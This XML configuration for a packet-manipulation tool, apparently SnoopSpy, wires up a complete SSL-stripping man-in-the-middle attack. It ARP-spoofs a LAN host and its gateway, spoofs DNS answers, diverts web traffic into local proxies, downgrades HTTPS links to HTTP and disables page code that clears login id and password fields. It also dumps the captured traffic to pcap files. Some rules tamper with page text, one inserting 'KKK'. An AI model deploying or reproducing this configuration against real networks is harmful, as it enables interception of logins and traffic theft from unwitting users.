<sslstrip>
  <graph>
    <objectList>
      <object layer="0" autoParse="true" autoRead="true" queueTime="1024" correctChecksum="true" enabled="false" queueLen="8192" tos="0" _class="SnoopWinDivert" filter="(ifIdx!=1) and outbound and (tcp.DstPort==80 or tcp.DstPort==8080 or tcp.DstPort==8888 or tcp.DstPort==443 or tcp.DstPort==4433 or udp.DstPort==53)" name="wdOutbound" priority="0" flags="0"/>
      <object snapLen="1600" autoParse="true" selfRelay="true" autoRead="true" enabled="true" _class="SnoopArpSpoof" filter="tcp dst port 80 or tcp dst port 8080 or tcp dst port 8888 or tcp dst port 443 or tcp dst port 4433 or udp dst port 53" adapterIndex="0" infectInterval="1000" virtualMac="000000-000000" name="as" readTimeout="1" flags="1" disableAutoRouting="true">
        <sessionList>
          <session senderIp="192.168.10.2" targetMac="000000-000000" targetIp="192.168.10.1" senderMac="000000-000000"/>
        </sessionList>
      </object>
      <object checkInterval="1" _class="SnoopFlowMgr" macFlowTimeout="3600" ipFlowTimeout="300" name="fmOutboundProcessFilter" udpFlowTimeout="300" tcpFlowTimeout="300"/>
      <object showStatus="false" flowMgr="fmOutboundProcessFilter" _class="SnoopProcessFilter" name="pfOutbound">
        <policies>
          <policy ack="false" processName=""/>
          <policy ack="false" processName="chrome.exe"/>
          <policy ack="false" processName="firefox.exe"/>
          <policy ack="true" processName="httpproxy.exe"/>
          <policy ack="false" processName="iexplore.exe"/>
          <policy ack="false" processName="netclient.exe"/>
          <policy ack="true" processName="netserver.exe"/>
          <policy ack="true" processName="snoopspy.exe"/>
          <policy ack="true" processName="sscon.exe"/>
          <policy ack="false" processName="svchost.exe"/>
        </policies>
      </object>
      <object checkInterval="1" _class="SnoopFlowMgr" macFlowTimeout="3600" ipFlowTimeout="300" name="fmOutbound" udpFlowTimeout="300" tcpFlowTimeout="300"/>
      <object layer="0" autoParse="true" autoRead="true" queueTime="1024" correctChecksum="true" enabled="true" queueLen="8192" tos="0" _class="SnoopWinDivert" filter="(ifIdx==1) and (tcp.SrcPort=8079 or tcp.SrcPort=4432 or tcp.SrcPort=8042)" name="wdInbound" priority="0" flags="0"/>
      <object checkInterval="1" _class="SnoopFlowMgr" macFlowTimeout="3600" ipFlowTimeout="300" name="fmInboundProcessFilter" udpFlowTimeout="300" tcpFlowTimeout="300"/>
      <object showStatus="false" flowMgr="fmInboundProcessFilter" _class="SnoopProcessFilter" name="pfInbound">
        <policies>
          <policy ack="false" processName=""/>
          <policy ack="true" processName="httpproxy.exe"/>
          <policy ack="true" processName="netserver.exe"/>
          <policy ack="true" processName="snoopspy.exe"/>
          <policy ack="true" processName="sscon.exe"/>
        </policies>
      </object>
      <object checkInterval="1" _class="SnoopFlowMgr" macFlowTimeout="3600" ipFlowTimeout="300" name="fmInbound" udpFlowTimeout="300" tcpFlowTimeout="300"/>
      <object toFlowMgr="fmInbound" tcpChange="true" fromFlowMgr="fmOutbound" udpChange="false" _class="SnoopFlowChange" name="fc">
        <changeItems>
          <item srcPortFixValue="0" dstIpFixValue="127.0.0.1" dstPortFixValue="8042" enabled="true" dstIp="80.43.80.43" dstPort="80" srcIp="0.0.0.0" srcIpFixValue="127.0.0.1" srcPortChangeType="1" log="true" protocol="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcIpChangeType="1" srcPort="0" dstPortChangeType="2" dstIpChangeType="1"/>
          <item srcPortFixValue="0" dstIpFixValue="127.0.0.1" dstPortFixValue="8042" enabled="true" dstIp="80.43.80.43" dstPort="8080" srcIp="0.0.0.0" srcIpFixValue="127.0.0.1" srcPortChangeType="1" log="true" protocol="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcIpChangeType="1" srcPort="0" dstPortChangeType="2" dstIpChangeType="1"/>
          <item srcPortFixValue="0" dstIpFixValue="127.0.0.1" dstPortFixValue="8042" enabled="true" dstIp="80.43.80.43" dstPort="8888" srcIp="0.0.0.0" srcIpFixValue="127.0.0.1" srcPortChangeType="1" log="true" protocol="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcIpChangeType="1" srcPort="0" dstPortChangeType="2" dstIpChangeType="1"/>
          <item srcPortFixValue="0" dstIpFixValue="127.0.0.1" dstPortFixValue="8079" enabled="true" dstIp="0.0.0.0" dstPort="80" srcIp="0.0.0.0" srcIpFixValue="127.0.0.1" srcPortChangeType="1" log="false" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcIpChangeType="1" srcPort="0" dstPortChangeType="2" dstIpChangeType="1"/>
          <item srcPortFixValue="0" dstIpFixValue="127.0.0.1" dstPortFixValue="8079" enabled="true" dstIp="0.0.0.0" dstPort="8080" srcIp="0.0.0.0" srcIpFixValue="127.0.0.1" srcPortChangeType="1" log="false" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcIpChangeType="1" srcPort="0" dstPortChangeType="2" dstIpChangeType="1"/>
          <item srcPortFixValue="0" dstIpFixValue="127.0.0.1" dstPortFixValue="8079" enabled="true" dstIp="0.0.0.0" dstPort="8888" srcIp="0.0.0.0" srcIpFixValue="127.0.0.1" srcPortChangeType="1" log="false" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcIpChangeType="1" srcPort="0" dstPortChangeType="2" dstIpChangeType="1"/>
          <item srcPortFixValue="0" dstIpFixValue="127.0.0.1" dstPortFixValue="4432" enabled="true" dstIp="0.0.0.0" dstPort="443" srcIp="0.0.0.0" srcIpFixValue="127.0.0.1" srcPortChangeType="1" log="false" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcIpChangeType="1" srcPort="0" dstPortChangeType="2" dstIpChangeType="1"/>
          <item srcPortFixValue="0" dstIpFixValue="127.0.0.1" dstPortFixValue="4432" enabled="true" dstIp="0.0.0.0" dstPort="4433" srcIp="0.0.0.0" srcIpFixValue="127.0.0.1" srcPortChangeType="1" log="false" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcIpChangeType="1" srcPort="0" dstPortChangeType="2" dstIpChangeType="1"/>
        </changeItems>
      </object>
      <object layer="0" SubIfIdx="0" autoParse="false" autoRead="false" queueTime="1024" correctChecksum="true" IfIdx="1" enabled="true" queueLen="8192" tos="0" _class="SnoopWriteWinDivert" filter="true" name="wwdOutbound" priority="0" changeDivertAddr="true" Direction="0" flags="1"/>
      <object sslEnabled="false" disableLoopbackConnection="false" _class="VHttpProxy" outInThreadTimeout="30000" name="hpTcpIn" tcpEnabled="true" maxContentCacheSize="10485756" keepAliveTimeout="60000">
        <outPolicy port="8080" host="127.0.0.1" method="1"/>
        <tcpServer port="8079" onceWriteSize="0" _class="VTcpServer" localHost="127.0.0.1"/>
        <sslServer port="4433" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" certificatePath="certificate\" _class="VSslServer" methodType="4" localHost=""/>
        <inboundDataChange/>
        <outboundDataChange>
          <item cs="1" pattern="Accept-Encoding: gzip," minimal="false" enabled="true" log="false" replace="Accept-Encoding:      " syntax="2"/>
        </outboundDataChange>
      </object>
      <object sslEnabled="false" disableLoopbackConnection="true" _class="VHttpProxy" outInThreadTimeout="30000" name="hpTcpOut" tcpEnabled="true" maxContentCacheSize="10485756" keepAliveTimeout="60000">
        <outPolicy port="0" host="" method="1"/>
        <tcpServer port="8080" onceWriteSize="0" _class="VTcpServer" localHost="127.0.0.1"/>
        <sslServer port="4433" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" certificatePath="certificate\" _class="VSslServer" methodType="4" localHost=""/>
        <inboundDataChange>
          <item cs="0" pattern="MIchael" minimal="false" enabled="true" log="true" replace="GILBERT" syntax="2"/>
          <item cs="1" pattern="https://" minimal="false" enabled="true" log="true" replace="http://ss." syntax="2"/>
          <item cs="1" pattern="$('id').value = &quot;&quot;;" minimal="false" enabled="true" log="true" replace="// hacked id" syntax="2"/>
          <item cs="1" pattern="$('pw').value = &quot;&quot;;" minimal="false" enabled="true" log="true" replace="// hacked pw" syntax="2"/>
        </inboundDataChange>
        <outboundDataChange/>
      </object>
      <object sslEnabled="true" disableLoopbackConnection="false" _class="VHttpProxy" outInThreadTimeout="30000" name="hpSslIn" tcpEnabled="false" maxContentCacheSize="10485756" keepAliveTimeout="60000">
        <outPolicy port="4433" host="127.0.0.1" method="1"/>
        <tcpServer port="8080" onceWriteSize="0" _class="VTcpServer" localHost=""/>
        <sslServer port="4432" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" certificatePath="certificate\" _class="VSslServer" methodType="4" localHost="127.0.0.1"/>
        <inboundDataChange/>
        <outboundDataChange>
          <item cs="1" pattern="Accept-Encoding: gzip," minimal="false" enabled="true" log="false" replace="Accept-Encoding:      " syntax="2"/>
        </outboundDataChange>
      </object>
      <object sslEnabled="false" disableLoopbackConnection="true" _class="VHttpProxy" outInThreadTimeout="30000" name="hpSslOut" tcpEnabled="true" maxContentCacheSize="10485756" keepAliveTimeout="60000">
        <outPolicy port="0" host="" method="2"/>
        <tcpServer port="4433" onceWriteSize="0" _class="VTcpServer" localHost="127.0.0.1"/>
        <sslServer port="4433" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" certificatePath="certificate\" _class="VSslServer" methodType="4" localHost=""/>
        <inboundDataChange>
          <item cs="1" pattern="Mark Zukerberg" minimal="false" enabled="true" log="true" replace="GILBERT LEE" syntax="2"/>
          <item cs="1" pattern="Money for every moment." minimal="false" enabled="true" log="true" replace="KKK" syntax="2"/>
        </inboundDataChange>
        <outboundDataChange/>
      </object>
      <object layer="0" autoParse="true" autoRead="true" queueTime="1024" correctChecksum="true" enabled="true" queueLen="8192" tos="0" _class="SnoopWinDivert" filter="ifIdx==1 and outbound and (tcp.SrcPort==8080 or tcp.DstPort==8080 or tcp.SrcPort==4433 or tcp.DstPort==4433 or tcp.SrcPort==8043 or tcp.DstPort==8043)" name="wdProxy" priority="0" flags="1"/>
      <object linkType="1" filePath="pcap/httpsniff_%04d%02d%02d.%02d%02d.%02d.%03d.pcap" _class="SnoopDump" name="dProxy"/>
      <object snapLen="1600" autoParse="false" srcMac="000000-000000" dstMac="000000-000000" autoRead="false" enabled="true" _class="SnoopWriteAdapter" filter="" adapterIndex="1" name="waProxy" readTimeout="1" flags="1"/>
      <object linkType="1" _class="SnoopBpFilter" filter="udp dst port 53" name="BpFilter1"/>
      <object _class="SnoopDnsChange" name="DnsChange1" capture="as">
        <changeItems>
          <item cs="1" pattern="ss.*" minimal="false" enabled="true" log="true" ip="80.43.80.43" syntax="1"/>
        </changeItems>
      </object>
      <object sslEnabled="true" disableLoopbackConnection="false" _class="VHttpProxy" outInThreadTimeout="30000" name="hpStripIn" tcpEnabled="true" maxContentCacheSize="10485756" keepAliveTimeout="60000">
        <outPolicy port="8043" host="127.0.0.1" method="1"/>
        <tcpServer port="8042" onceWriteSize="0" _class="VTcpServer" localHost="127.0.0.1"/>
        <sslServer port="4433" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" certificatePath="certificate\" _class="VSslServer" methodType="4" localHost=""/>
        <inboundDataChange/>
        <outboundDataChange>
          <item cs="1" pattern="Accept-Encoding: gzip," minimal="false" enabled="true" log="false" replace="Accept-Encoding:      " syntax="2"/>
          <item cs="1" pattern="Host: ss." minimal="false" enabled="true" log="true" replace="Host: " syntax="2"/>
        </outboundDataChange>
      </object>
      <object sslEnabled="false" disableLoopbackConnection="true" _class="VHttpProxy" outInThreadTimeout="30000" name="hpStripOut" tcpEnabled="true" maxContentCacheSize="10485756" keepAliveTimeout="60000">
        <outPolicy port="0" host="" method="2"/>
        <tcpServer port="8043" onceWriteSize="0" _class="VTcpServer" localHost="127.0.0.1"/>
        <sslServer port="4433" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" certificatePath="certificate\" _class="VSslServer" methodType="4" localHost=""/>
        <inboundDataChange>
          <item cs="1" pattern="https://" minimal="false" enabled="true" log="true" replace="http://ss." syntax="2"/>
        </inboundDataChange>
        <outboundDataChange/>
      </object>
    </objectList>
    <connectList>
      <connect sender="wdOutbound" slot="process(SnoopPacket*)" signal="captured(SnoopPacket*)" receiver="fmOutboundProcessFilter"/>
      <connect sender="as" slot="process(SnoopPacket*)" signal="captured(SnoopPacket*)" receiver="fmOutbound"/>
      <connect sender="fmOutboundProcessFilter" slot="check(SnoopPacket*)" signal="processed(SnoopPacket*)" receiver="pfOutbound"/>
      <connect sender="pfOutbound" slot="process(SnoopPacket*)" signal="nak(SnoopPacket*)" receiver="fmOutbound"/>
      <connect sender="fmOutbound" slot="processFromTo(SnoopPacket*)" signal="processed(SnoopPacket*)" receiver="fc"/>
      <connect sender="wdInbound" slot="process(SnoopPacket*)" signal="captured(SnoopPacket*)" receiver="fmInboundProcessFilter"/>
      <connect sender="fmInboundProcessFilter" slot="check(SnoopPacket*)" signal="processed(SnoopPacket*)" receiver="pfInbound"/>
      <connect sender="pfInbound" slot="process(SnoopPacket*)" signal="ack(SnoopPacket*)" receiver="fmInbound"/>
      <connect sender="fmInbound" slot="processToFrom(SnoopPacket*)" signal="processed(SnoopPacket*)" receiver="fc"/>
      <connect sender="fc" slot="move(SnoopPacket*)" signal="changedFromTo(SnoopPacket*)" receiver="wwdOutbound"/>
      <connect sender="wdProxy" slot="dump(SnoopPacket*)" signal="captured(SnoopPacket*)" receiver="dProxy"/>
      <connect sender="wdProxy" slot="copy(SnoopPacket*)" signal="captured(SnoopPacket*)" receiver="waProxy"/>
      <connect sender="wdOutbound" slot="check(SnoopPacket*)" signal="captured(SnoopPacket*)" receiver="BpFilter1"/>
      <connect sender="BpFilter1" slot="check(SnoopPacket*)" signal="ack(SnoopPacket*)" receiver="DnsChange1"/>
      <connect sender="as" slot="check(SnoopPacket*)" signal="captured(SnoopPacket*)" receiver="BpFilter1"/>
    </connectList>
  </graph>
  <coord>
    <object x="-165" y="-115" name="wdOutbound"/>
    <object x="-258" y="-119" name="as"/>
    <object x="-202" y="-77" name="fmOutboundProcessFilter"/>
    <object x="-164" y="-38" name="pfOutbound"/>
    <object x="-165" y="2" name="fmOutbound"/>
    <object x="3" y="-115" name="wdInbound"/>
    <object x="-36" y="-76" name="fmInboundProcessFilter"/>
    <object x="2" y="-39" name="pfInbound"/>
    <object x="-1" y="1" name="fmInbound"/>
    <object x="-55" y="36" name="fc"/>
    <object x="-175" y="74" name="wwdOutbound"/>
    <object x="-154" y="116" name="hpTcpIn"/>
    <object x="-160" y="154" name="hpTcpOut"/>
    <object x="12" y="115" name="hpSslIn"/>
    <object x="5" y="149" name="hpSslOut"/>
    <object x="-130" y="224" name="wdProxy"/>
    <object x="6" y="199" name="dProxy"/>
    <object x="6" y="238" name="waProxy"/>
    <object x="-302" y="-69" name="BpFilter1"/>
    <object x="-312" y="-27" name="DnsChange1"/>
    <object x="-277" y="117" name="hpStripIn"/>
    <object x="-278" y="156" name="hpStripOut"/>
  </coord>
</sslstrip>
